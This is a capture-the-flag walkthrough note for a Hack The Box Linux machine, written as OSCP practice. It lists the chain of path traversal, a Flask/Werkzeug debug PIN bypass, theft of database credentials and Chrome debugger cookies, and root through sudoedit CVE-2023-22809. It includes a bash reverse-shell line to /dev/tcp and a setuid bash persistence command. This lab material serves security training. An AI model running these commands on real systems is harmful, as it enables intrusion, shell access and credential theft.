## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)
- **Exploits Used**:
  - [HTTP](HTTP) File Read Vulnerability via `/download?fn=...`
  - Flask Debug Mode Code Execution via Werkzeug PIN Bypass
  - Database Credential Extraction 🐍
  - Chrome Remote Debugging Cookie Stealing 🥸
  - [Sudoedit](https://nvd.nist.gov/vuln/detail/CVE-2023-22809) via CVE-2023-22809 to escalate to root 🧨
- **Open Ports**:
  - [SSH](SSH) (22)
  - [HTTP](HTTP) (80)

---

[Tools](Tools)
- `nmap` 🛰️
- `feroxbuster` 🦡
- `curl` 🌐
- `Burp Suite` 🐞
- `sshpass` 🧑‍💻
- `mysql` 🐬
- `Chromium DevTools` 🔧
- `nc` 📞
- `Selenium` 🧪
- `pytest` 🔁
- `sudoedit` ✍️

---

### Commands to Solve Box

#### 🧭 Recon
```bash
nmap -p- --min-rate 10000 10.10.11.203
nmap -p 22,80 -sCV 10.10.11.203
feroxbuster -u http://superpass.htb --dont-extract-links
```

#### 🪝 Initial Access (www-data)
- Exploit `/download?fn=../../../../etc/passwd` to confirm file read vuln.
- Leak Flask Debug PIN via [Werkzeug debug PIN generation](https://book.hacktricks.xyz/pentesting-web/flask-pin-obtain-remote-code-execution).
- Use leaked info to generate correct PIN and gain RCE via Flask console.
- Spawn reverse shell via `os.system('bash -c "bash -i >& /dev/tcp/10.10.14.X/443 0>&1"')`.

#### 📂 Escalation to User corum
- Read `/app/config_prod.json` and connect to DB using `mysql`.
- Extract corum’s password from DB and login via `sshpass`.

```bash
mysql -u superpassuser -p'dbpassword' superpass
```

#### 🧪 Shell as edwards
- Tunnel `localhost:5555` and `localhost:41829` using:
```bash
ssh -L 5555:localhost:5555 -L 41829:localhost:41829 corum@superpass.htb
```
- Access [Chrome Debugger](chrome://inspect) and steal cookies for edwards.
- Reuse cookie to extract password, login via `ssh`.

#### 🚨 Root Access
- Exploit [CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809) using `sudoedit` with `EDITOR='vim -- /app/venv/bin/activate'`.
- Inject:
```bash
cp /bin/bash /tmp/0xdf; chmod +s /tmp/0xdf
```
- Wait for cron/root login, then:
```bash
/tmp/0xdf -p
```

---

### ✅ Actions Learned From This Box
- 🧠 Deep understanding of Flask’s debug mode and Werkzeug PIN generation.
- 🐍 How Python virtual environments interact with `bashrc`.
- 🔎 Abuse of Chrome remote debugging via dev test pipelines.
- ⚠️ The power (and danger) of misconfigured `sudoedit` privileges.
- 🧬 Realistic dev-to-prod test integration flaws, great CI/CD misconfig example.
- 🎯 Tunneling techniques for local-only service access.

---

### References 📚
- 📖 [HackTricks: Flask Debug RCE](https://book.hacktricks.xyz/pentesting-web/flask-pin-obtain-remote-code-execution)
- 📖 [CVE-2023-22809 sudoedit Exploit](https://www.qualys.com/2023/01/30/cve-2023-22809/cve-2023-22809.txt)
- 🛠️ [Werkzeug Source for PIN Gen](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py)
- 🧪 [Selenium Chrome Debug Port Abuse](https://security.snyk.io/vuln/SNYK-PYTHON-SELENIUM-3187814)
- 🧠 [0xdf's Full Write-up](https://0xdf.gitlab.io/2023/08/05/htb-agile.html)

---

Let me know when you want the next one prepped like this! 💻🔥